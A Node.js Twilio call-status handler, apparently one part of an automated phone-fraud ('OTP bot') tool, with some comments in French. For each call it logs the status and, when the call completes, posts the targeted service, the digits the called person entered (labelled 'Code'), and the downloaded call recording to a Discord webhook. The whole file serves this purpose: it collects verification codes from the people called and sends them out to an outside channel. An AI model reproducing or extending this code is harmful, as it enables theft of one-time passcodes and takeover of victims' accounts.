module.exports = async function(request, response) {
    /**
     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
     */
    const config = require('.././config');
    const axios = require('axios');
    const fs = require('fs')
    const https = require('https')
    const download = require("node-file-downloader")

    /**
     * Mongodb Calls Collection
     */
    const callsModel = require('../Database/Models/calls')

    /**
     * Instantiation of dependencies allowing the use of the discord webhook
     */
    const {
        Webhook,
        MessageBuilder
    } = require('discord-webhook-node');
    const hook = new Webhook(config.discordwebhook || '');

    /**
     * Retrieval of posted variables allowing to order the modification of the status
     */
    var itsfrom = request.body.From || null;
    var itsto = request.body.To || null;
    var sid = request.body.CallSid;
    var answeredby;
    var status;

    /**
     * If there is a sid with the CallSid then it is a call
     */
    if (sid != undefined) {
        status = request.body.CallStatus;
        answeredby = request.body.AnsweredBy;
        sidname = 'callSid';
    }

    if (itsfrom == null || itsto == null || sid == undefined || sid == null) {
        return response.status(200).json({
            error: 'Please send all the needed post data.'
        });
    }

    /**
     * We check if there is not already the data recorded in DB
     */
    let calls = await callsModel.findOne({
        callsid: sid
    })
    if (calls == undefined) {
        calls = new callsModel({
            itsfrom: itsfrom,
            itsto: itsto,
            status: status,
            date: Date.now(),
            callsid: sid
        })

        await calls.save().catch(err => console.log(err));
        return response.status(200).json({
            inserted: 'All is alright.'
        });
    } else {
        //const record = await fetch(`https://api.twilio.com/2010-04-01/Accounts/${config.accountSid}/Calls/${sid}/Recordings.json`).then(response => response.json());

        /**
         * Otherwise we update it, mainly the status
         */
        await callsModel.findOneAndUpdate({
            callsid: sid
        }, {
            status: status,
            itsfrom: itsfrom,
            itsto: itsto,
            date: Date.now(),
            callsid: sid
        })

        if (status == 'ringing' && config.discordwebhook != undefined) {

            var embed;

            embed = new MessageBuilder()
                .setTitle(`:mobile_phone: ${itsto}`)
                .setColor('3447003')
                .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:bell: Service: ${calls.service}\n:calling: Ringing...`)
                .setTimestamp();
            hook.send(embed)
        } else if (status == 'busy' && config.discordwebhook != undefined) {
            var embed;

            embed = new MessageBuilder()
                .setTitle(`:mobile_phone: ${itsto}`)
                .setColor('11027200')
                .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:bell: Service: ${calls.service}\n:no_entry: Line is busy`)
                .setTimestamp();
            hook.send(embed)
        } else if (status == 'no-answer' && config.discordwebhook != undefined) {
            var embed;

            embed = new MessageBuilder()
                .setTitle(`:mobile_phone: ${itsto}`)
                .setColor('15548997')
                .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:bell: Service: ${calls.service}\n:no_mobile_phones: No answer`)
                .setTimestamp();
            hook.send(embed)
        } else if (status == 'failed' && config.discordwebhook != undefined) {
            var embed;

            embed = new MessageBuilder()
                .setTitle(`:mobile_phone: ${itsto}`)
                .setColor('10038562')
                .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:bell: Service: ${calls.service}\n:no_entry_sign: Call failed`)
                .setTimestamp();
            hook.send(embed)
        } else if (status == 'in-progress' && config.discordwebhook != undefined) {
            /**
             * If the code is empty, then the person has not answered /given a code
             */
            var embed;

            embed = new MessageBuilder()
                .setTitle(`:mobile_phone: ${itsto}`)
                .setColor('1752220')
                .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:bell: Service: ${calls.service}\n:calling: Call in progress`)
                .setTimestamp();
            hook.send(embed)

        } else if (status == 'completed' && config.discordwebhook != undefined) {
            const rec = await axios.get(`https://api.twilio.com/2010-04-01/Accounts/${config.accountSid}/Calls/${sid}/Recordings.json`, {
                auth: {
                    username: config.accountSid,
                    password: config.authToken
                }
            })

            var embed;

            if (answeredby == "machine_start") {
                embed = new MessageBuilder()
                    .setTitle(`:mobile_phone: ${itsto}`)
                    .setColor('15105570')
                    .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:envelope_with_arrow: Voicemail Detected`)
                    .setTimestamp();

                hook.send(embed)
            } else {
                if (calls.digits == '' || calls.digits == undefined) {
                    embed = new MessageBuilder()
                        .setTitle(`:mobile_phone: ${itsto}`)
                        .setColor('15105570')
                        .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n:man_detective: The user didn't respond or enter the code.`)
                        .setTimestamp();
                } else {
                    embed = new MessageBuilder()
                        .setTitle(`:mobile_phone: ${itsto}`)
                        .setColor('5763719')
                        .setDescription(`:man_shrugging: User : <@${calls.user}>\n\n :bell: Service: ${calls.service}\n:man_detective: Code : **${calls.digits}**`)
                        .setTimestamp();
                }

                const url = `${rec.data.recordings[0].media_url}.wav`
                download(url, 'transcript.wav', function(){
                    hook.send(embed)
                    hook.sendFile("transcript.wav")
                })
            }
        }

        return response.status(200).json({
            inserted: 'All is alright.'
        });
    }
};